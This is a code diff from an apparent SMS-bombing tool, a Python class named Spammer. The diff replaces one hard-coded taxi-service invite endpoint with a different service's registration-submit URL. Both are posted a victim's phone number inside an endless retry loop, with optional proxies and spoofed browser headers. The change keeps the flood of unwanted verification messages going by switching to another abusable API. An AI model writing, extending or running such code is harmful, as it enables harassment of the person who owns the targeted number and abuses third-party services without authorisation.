@@ -78,9 +78,9 @@ class Spammer:
             while True:
                 try:
                     if proxy == None:
-                        r = requests.post('http://83.136.86.63:8200/est-taxi/create-invite/1.0/', data={'phone-number': _phone, 'application-acronym': 'TAXI_MAGNIT'}, headers={'Connection': 'Keep-Alive', 'User-Agent': 'Apache-HttpClient/UNAVAILABLE (java 1.4)', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '102', 'Host': '83.136.86.63:8200'})
+                        r = requests.post('https://allo-balashov.hivelogin.ru:444/api/client/mobile/1.0/registration/submit', data={'phone': _phone}, headers={'Accept-Encoding': 'gzip', 'Accept-Language': 'ru,en;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36', 'Content-Length': '24', 'Content-Type': 'application/json; charset=UTF-8', 'Connection': 'keep-alive'})
                     else:
-                        r = requests.post('http://83.136.86.63:8200/est-taxi/create-invite/1.0/', data={'phone-number': _phone, 'application-acronym': 'TAXI_MAGNIT'}, headers={'Connection': 'Keep-Alive', 'User-Agent': 'Apache-HttpClient/UNAVAILABLE (java 1.4)', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '102', 'Host': '83.136.86.63:8200'}, proxies={'http': str(proxy), 'https': str(proxy)})
+                        r = requests.post('https://allo-balashov.hivelogin.ru:444/api/client/mobile/1.0/registration/submit', data={'phone': _phone}, headers={'Accept-Encoding': 'gzip', 'Accept-Language': 'ru,en;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36', 'Content-Length': '24', 'Content-Type': 'application/json; charset=UTF-8', 'Connection': 'keep-alive'}, proxies={'http': str(proxy), 'https': str(proxy)})
                 except requests.exceptions.ConnectionError:
                     print showstatus(wrapsbrace(('thread-{}').format(thread_name)) + wrapsbrace('except', True) + ('ConnectionError thrown! Sleeping for {}s . . .').format(delaytime), 'warn')
                     sleep(delaytime)
